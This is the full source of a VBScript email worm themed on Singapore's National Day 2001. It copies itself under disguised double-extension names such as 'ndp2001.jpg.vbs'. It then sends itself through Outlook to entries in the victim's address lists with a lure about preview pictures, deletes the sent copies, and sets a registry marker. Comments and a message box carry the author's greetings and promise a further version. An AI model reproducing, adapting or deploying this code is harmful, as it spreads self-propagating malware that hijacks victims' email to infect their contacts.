set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.GetFile(WScript.ScriptFullName)
c.Copy("c:"&"\national_day2001.jpg.vbs")
c.Copy("c:\WINDOWS"&"\ndp2001.jpg.vbs")
set write1=fso.CreateTextFile("C:"&"\READ.txt")
write1.WriteLine "National Day Preview 1.0"
write1.Close
on error resume next
set ws=CreateObject("WScript.Shell")
set look=ws.RegRead("HKEY_CURRENT_USER\Software\NDP2001")
if (look <> "Finished") Then
set outapp=WScript.CreateObject("Outlook.Application")
set mapi = outapp.GetNameSpace("MAPI")
for lists = 1 to mapi.AddressLists.Count
set lsts = mapi.AddressLists(lists)
x = 1
recips = lsts.AddressEntries(x)
set email = outapp.CreateItem(0)
email.Recipients.Add(recips)
email.Subject = "Fwd: National Day 2001 Preview Pictures!"
email.Body = "Hi there," & vbcrlf & "Pictures taken from 28th July National Day Preview!"
email.Attachments.Add "c:\WINDOWS\ndp2001.jpg.vbs"
email.DeleteAfterSubmit = True
email.Send
ws.RegWrite "HKEY_CURRENT_USER\Software\NDP2001","Finished"
MsgBox("Happy National Day Singapore" & Chr(13) & "Greetz to all Guards-Of-Honour / Cheerleaders / Cute Boys / Watch me again on 9th Aug")
Next
End If
'shouts to all singaporeans. happy 36th birthday
'Colonel Ong did it again / On 9th Aug, another version will appear.